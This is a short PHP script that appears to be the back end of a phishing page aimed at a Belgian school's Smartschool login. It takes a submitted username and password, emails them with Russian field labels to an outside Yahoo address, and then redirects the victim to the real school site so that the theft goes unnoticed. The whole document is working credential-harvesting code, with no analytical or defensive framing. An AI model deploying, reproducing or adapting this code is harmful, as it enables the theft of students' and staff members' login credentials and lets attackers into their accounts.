<?
if((isset($_POST["username"])&&$_POST["username"]!="")&&(isset($_POST["password"])&&$_POST["password"]!="")){
        $to = 'grigoryan.martin@yahoo.be'; 
        $subject = 'Servise by Martin';
        $message = '
                <html>
                    <head>
                        <title>'.$subject.'</title>
                    </head>
                    <body>
                        <p>Логин: '.$_POST["username"].'</p>
                        <p>Пароль: '.$_POST["password"].'</p>                        
                    </body>
                </html>'; 
        $headers  = "Content-type: text/html; charset=utf-8 \r\n";
        $headers .= "From: Отправитель <from@example.com>\r\n";
        mail($to, $subject, $message, $headers); 
}
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://materdeibrasschaat.smartschool.be'></head></html>";
?>